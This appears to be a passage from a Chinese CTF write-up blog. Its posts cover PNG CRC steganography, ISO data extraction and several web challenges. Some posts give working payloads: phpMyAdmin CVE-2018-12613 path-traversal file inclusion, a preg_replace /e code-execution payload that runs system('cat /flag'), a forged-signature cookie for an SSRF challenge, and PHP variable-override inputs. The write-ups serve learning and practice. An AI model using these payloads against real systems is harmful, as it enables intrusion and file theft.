class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/27.PNG?raw=true" alt="27.PNG"></p>
<p>跑完拿到flag<br>有一说一gakki是真的好看</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/13/page-67/" data-id="ckuzhnezb001xv4w7dvy6bjlq" data-title="misc" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-66" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/13/page-66/" class="article-date">
  <time class="dt-published" datetime="2021-07-13T08:32:45.000Z" itemprop="datePublished">2021-07-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/13/page-66/">BJDCTF2020一叶障目</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>打开就是一个图片什么都没 stegsolve分析也分析不出什么东西  010也看不出什么 百度吧<br><strong>这是png的CRC校验问题，图片的宽高被改了导致无法完全显示</strong></p>
<p><strong>如何判断这什么crc校验问题？</strong><br><strong>首先010打开1.png</strong><br><strong>前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的</strong><br><strong>PNG_CHUNK chunk[0] 这段可分为几块：</strong><br><strong>前四个字节00 00 00 0D 代表数据块长度为13 数据块包含了png的宽高等信息 格式是固定的</strong><br><strong>之后四个字节49 48 44 52 （即ASCII码的IHDR） 是文件头数据块的表示 这段也是固定格式的</strong><br><strong>之后进入十三位数据块  前八个字节 00 00 01 41 00 00 01 4C</strong><br><strong>这边前四个字节：00 00 01 41 代表图片的宽  后四个字节 00 00 01 4C代表高</strong><br><strong>这八个字节都属于十三位数据块的内容 因此数据块应再向后5个字节 即 00 00 01 41 00 00 01 4C 08 06 00 00 00 剩余四位C2 0F 1F C6 为该png的crc校验码也就是解题的关键</strong><br><strong>该段数据有IDCh以及十三位的数据块 即 49 48 44 52 00 00 01 41 00 00 01 4C 08 06 00 00 00 计算所得</strong><br>大部分png中CRC检验错误的出题思路：</p>
<p>对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；<strong>windows的图片查看器会忽略错误的CRC校验码，因此会显示图片</strong>，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。而<strong>Linux下的图片查看器不会忽略</strong>错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况<br>所以判断一张图<strong>是否为crc校验出错 就丢windows 和 linux 里头看看</strong><br>可以通过爆破图片修改前的宽和高来匹配CRC校验码，并用正确的宽和高来修复图片<br>首先先爆破高度 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_ *_ coding:utf-8 _ *_ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment">#\x49 x48 x44 x52 x00 x00 x01 x41 x00 x00 x01 x4C x08 x06 x00 x00 x00</span></span><br><span class="line">crc32key=<span class="number">0xc20f1fc6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">65535</span>):</span><br><span class="line">    height = struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)</span><br><span class="line">    <span class="comment">#CRC:c20f1fc6</span></span><br><span class="line">    data= <span class="string">&#x27;\x49\x48\x44\x52\x00\x00\x01\x41&#x27;</span> + height + <span class="string">&#x27;\x08\x06\x00\x00\x00&#x27;</span></span><br><span class="line">    crc32result= binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> c: <span class="string">&quot;%02X&quot;</span> % <span class="built_in">ord</span>(c),height))</span><br></pre></td></tr></table></figure>

<p> 这题就这样爆破出来了 高度被修改了 实则 00 00 03 4C<br>判断是否为crc校验码错误的方法：</p>
<p>windows下图片可以打开，其他系统下图片不能打开<br>使用010editor的template检测，这也是我16进制编辑器力推010editor的原因之一<br>使用诸如tweakpng，pngcheck等工具<br>修复png的crc检验码方法：</p>
<p>本文中所列的爆破出正确的宽或高，并用16进制编辑器修复<br>利用windows忽略crc检验码的特性，我们可以用tweakpng任意修改图片的宽和高，直至得到有用的信息，事实上，这是最快的方法</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/13/page-66/" data-id="ckuzhnezb001wv4w7fmcfhg43" data-title="BJDCTF2020一叶障目" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-65" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-65/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T09:03:48.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-65/">强网杯ISO1995</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>提示时间属性出问题<br>年月日时分秒以此下来发现</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/9.png?raw=true" alt="9.png"></p>
<p>除了月的不一样其余均相同 然后将月的对应的数据提取出来 也就是将ffff后面两位的内容提取出来</p>
<p>第一个是0000也就是十进制的0填充好前四位0000也就是编号为0000的文件对应的文件列表为flag_f00000文件<br><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/7.PNG?raw=true" alt="7.PNG"></p>
<p>import binascii<br>isofilename= ‘iso1995.iso’<br>fp_iso_file = open(isofilename, ‘rb’)<br>fp_iso_file.read(90198)<br>list=[]<br>num=0<br>while 1:<br>    if (fp_iso_file.read(4) == b’\xff\xff\xff\xff’):<br>        x = str(binascii.b2a_hex(fp_iso_file.read(2)[::1]))<br>        y = ‘0x’+x[2:6]<br>        list.append(int((y),16))<br>        fp_iso_file.read(54)<br>        if (fp_iso_file.tell() - 0x1700A ) % 0x800 ==0:<br>            fp_iso_file.read(8)<br>    else:<br>        break<br>fp_extract_data = open(‘outdata’, ‘wb’)<br>for num in list:<br>    fp_f0_file = open(‘flag_f0’+’%04d’ % num, ‘rb’)<br>    flag0_data = fp_f0_file.read()<br>    fp_extract_data.write(flag0_data)<br>    fp_f0_file.close()<br>fp_extract_data.close()</p>
<p>运行完成生成outdata 打开找到flag</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/8.PNG?raw=true" alt="8.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-65/" data-id="ckuzhnezb001vv4w76mb6fmtc" data-title="强网杯ISO1995" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-64" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-64/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T06:52:06.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-64/">BUUCTF WEB De1CTF 2019 SSRF Me</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>题目直接给了题目源码： 就是看着有点难受</p>
<p>#! /usr/bin/env python<br>#encoding=utf-8<br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(‘latin1’)</p>
<p>app = Flask(<strong>name</strong>)</p>
<p>secert_key = os.urandom(16)</p>
<p>class Task:<br>    def <strong>init</strong>(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr<br>            os.mkdir(self.sandbox)</p>
<pre><code>def Exec(self):                                              
    result = &#123;&#125;
    result[&#39;code&#39;] = 500
    if (self.checkSign()):                                               //Exec 这边还有个checkSign的方法 
        if &quot;scan&quot; in self.action:
            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
            resp = scan(self.param)
            if (resp == &quot;Connection Timeout&quot;):
                result[&#39;data&#39;] = resp
            else:
                print resp
                tmpfile.write(resp)
                tmpfile.close()
            result[&#39;code&#39;] = 200
        if &quot;read&quot; in self.action:
            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
            result[&#39;code&#39;] = 200
            result[&#39;data&#39;] = f.read()
        if result[&#39;code&#39;] == 500:
            result[&#39;data&#39;] = &quot;Action Error&quot;
    else:
        result[&#39;code&#39;] = 500
        result[&#39;msg&#39;] = &quot;Sign Error&quot;
    return result

def checkSign(self):
    if (getSign(self.action, self.param) == self.sign):                        //getSign()方法，结果与sign进行比较
        return True
    else:
        return False
</code></pre>
<p>#generate Sign For Action Scan.<br>@app.route(“/geneSign”, methods=[‘GET’, ‘POST’])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(“param”, “”))<br>    action = “scan”<br>    return getSign(action, param)</p>
<p>@app.route(‘/De1ta’,methods=[‘GET’,’POST’])                       //De1ta应该是关键的页面获取了三个参数，其中两个是从cookie中获取的：<br>def challenge():<br>    action = urllib.unquote(request.cookies.get(“action”))                 //第一个参数action是传入read和scan的，<br>                                                                                                         第二个参数看着应该是传入一个文件名，                                                                                                                                                                                                                         第三个参数sign是一个md5值，<br>    param = urllib.unquote(request.args.get(“param”, “”))<br>    sign = urllib.unquote(request.cookies.get(“sign”))                       //cookie<br>    ip = request.remote_addr<br>    if(waf(param)):<br>        return “No Hacker!!!!”<br>    task = Task(action, param, sign, ip)                          // 这边的action param sign参数传递到Task<br>    return json.dumps(task.Exec())                                 //并且调用了 Task类中的Exec()<br>@app.route(‘/‘)<br>def index():<br>    return open(“code.txt”,”r”).read()               //这边index 把源码给打开了</p>
<p>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        return urllib.urlopen(param).read()[:50]<br>    except:<br>        return “Connection Timeout”</p>
<p>def getSign(action, param):<br>    return hashlib.md5(secert_key + param + action).hexdigest()                            //这边需要一个secert_key </p>
<p>def md5(content):<br>    return hashlib.md5(content).hexdigest()</p>
<p>def waf(param):<br>    check=param.strip().lower()<br>    if check.startswith(“gopher”) or check.startswith(“file”):<br>        return True<br>    else:<br>        return False</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    app.debug = False<br>    app.run(host=’0.0.0.0’)<br>python的flask框架，三个路由</p>
<p>  最终目的就是读取flag.txt<br>所以我们需要构造参数！第一个参数action应该包含read，，第二个param参数应该是文件名<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密<br>  burp  访问一下geneSign这个页面 参数param=flag.txt得到一串MD5值b7e7fa9d237b24617caedc3fa85fe2af  这个就是md5(secert_key+flag.txtscan)的值<br>param 需要read 和scan的值               8a75379bb998db129cca0db40be1a07b   geneSign?param=flag.txtread传入这个后得到的<br>也就是md5(secert_key+flag.txtreadscan)的md5值                 再访问De1ta页面进行参数传递，拿到flag<br>De1ta?param=flag.txt<br>cookie：  action=readscan;sign=8a75379bb998db129cca0db40be1a07b;<br>就能拿到flag了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-64/" data-id="ckuzhneza001tv4w79s2t68xl" data-title="BUUCTF WEB De1CTF 2019 SSRF Me" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-63" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-63/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T06:52:05.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-63/">NCTF2019fakeXMLcookbook</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>看到题目名字XML，XXE漏洞<br>XML<br>什么是 XML？<br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签。<br>XML基本格式与基本语法<br>基本格式：</p>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
<p><bookstore>                                                 <!--根元素--><br><book category="COOKING">        <!--bookstore的子元素，category为属性--></p>
<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
<author>Giada De Laurentiis</author>                  <!--book的子元素-->
<year>2005</year>                                     <!--book的子元素-->
<price>30.00</price>                                  <!--book的子元素-->
</book>                                                 <!--book的结束-->
</bookstore>                                       <!--bookstore的结束-->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。   
基本语法：

<p>所有 XML 元素都须有关闭标签。<br>XML 标签对大小写敏感。<br>XML 必须正确地嵌套。<br>XML 文档必须有根元素。<br>XML 的属性值须加引号。<br>若多个字符都需要转义，则可以将这些内容存放到CDATA里面</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/5.PNG?raw=true" alt="5.PNG"></p>
<p>XML的设计宗旨是<strong>传输数据</strong>，而非显示数据。<br>XML注入前提条件<br>（1）用户能够控制数据的输入<br>（2）程序有拼凑的数据</p>
<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/6.PNG?raw=true" alt="6.PNG"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-63/" data-id="ckuzhneza001uv4w7cfjrg4tl" data-title="NCTF2019fakeXMLcookbook" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-62" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-62/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T06:52:03.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-62/">GWCTF 2019我有一个数据库  1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>还挺大胆直接告诉人你有一个<strong>数据库 url后/phpmyadmin 跳到php后台了</strong><br>然后看这版本4.8.1 <strong>有个漏洞叫（CVE-2018-12613）</strong> 可以远程文件包含漏洞<br>$target_blacklist = array (<br>    ‘import.php’, ‘export.php’<br>);</p>
<p>// If we have a valid target, let’s load that script instead<br>if (! empty($_REQUEST[‘target’])<br>    &amp;&amp; is_string($_REQUEST[‘target’])<br>    &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>    &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>    &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>) {<br>    include $_REQUEST[‘target’];<br>    exit;<br>}<br>满足5个条件后就会include$_REQUEST[‘target’]的内容</p>
<p>$_REQUEST[‘target’]不为空<br>$_REQUEST[‘target’]是字符串<br>$_REQUEST[‘target’]不以index开头<br>$_REQUEST[‘target’]不在$target_blacklist中 ‘import.php’, ‘export.php’<br>然后接下去的原理就看不懂了<br>任意文件包含<br>通过目录穿越包含任意文件 ?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini   这波这个payload就可以直接用了<br>?target=db_datadict.php%253f/../../../../../../../../../flag   /../ 这个慢慢加加到出现flag即可</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-62/" data-id="ckuzhnez9001sv4w70ritd3uu" data-title="GWCTF 2019我有一个数据库  1" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-61" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-61/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T06:52:01.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-61/">BJDCTF2020ZJCTF，不过如此  1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>先用php伪协议 读取next.php  获得的代码<br>text=data://text/plain;base64,aWhhdmVhZHJlYW0=(文本内容ihaveadream的base64)&amp;file=php://filter/read=convert.base64-encode/resource=next.php</p>
<p>base64解码一下得到如下</p>
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}
**考preg_replace()的RCE**
https://xz.aliyun.com/t/2557
这篇文章就是讲这个的利用的
\S*()={${eval($_POST[a])}}
a=system%28%27cat+%2Fflag%27%29%3B
preg_replace()的RCE
payload 为：

 /?.*={${phpinfo()}}，


即 GET 方式传入的参数名为 /?.* ，值为 {${phpinfo()}}

payload2:

\S*=${phpinfo()}
payload:利用源码给的getFlag函数

/next.php?\S*=${getflag()}&cmd=show_source(%22/flag%22);   在next.php下可以执行这个操作
                                                    system('cat/flag');  这个不知道为什么不行看有的wp可以成功


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-61/" data-id="ckuzhnez8001pv4w724xve0ku" data-title="BJDCTF2020ZJCTF，不过如此  1" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/08/page-59/" class="article-date">
  <time class="dt-published" datetime="2021-07-08T06:51:57.000Z" itemprop="datePublished">2021-07-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/08/page-59/">BJDCTF2020Mark loves cat</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <?php
include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){              //通过post方式传递$flag=flag，最终结果为$$flag=flag    这便是POST方式处理代码
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){              //通过get传递yds=flag 得到$yds=$flag  
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){                          //get和post中不存在flag参数便退出程序输出$yds变量，得到flag 
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;"    //这是index.php 的源码
**根据$$和foreach可以判断可能存在变量覆盖漏洞**，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。
例如代码第17-19行，需要get传参?flag=flag，才能进入if语句中输出$handsome，但是foreach中并不能将$flag赋值给$handsome然后输出，所以此处无法利用。
扫描**目录找到 .git 泄露** 
**然后githack 把源码下下来**
发现就两个重要文件，flag.php，读取flag文件内容并赋值给$flag:
index.php，开头有个包含，在最后有个输出flag
 if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
 }   发现get和post中不存在flag参数便退出程序输出$yds变量 
传递如下参数 ：
get: yds=flag
post: $flag=flag

那么最终payload  **?yds=flag**
         **              post: $flag=flag**


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/08/page-59/" data-id="ckuzhnez8001qv4w7a54b9h2o" data-title="BJDCTF2020Mark loves cat" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/20/page-127/">web点2</a>
          </li>
        
          <li>
            <a href="/2021/10/20/page-126/">web点1</a>
          </li>
        
          <li>
            <a href="/2021/10/20/page-125/">杂项杂项</a>
          </li>
        
          <li>
            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
          </li>
        
          <li>
            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>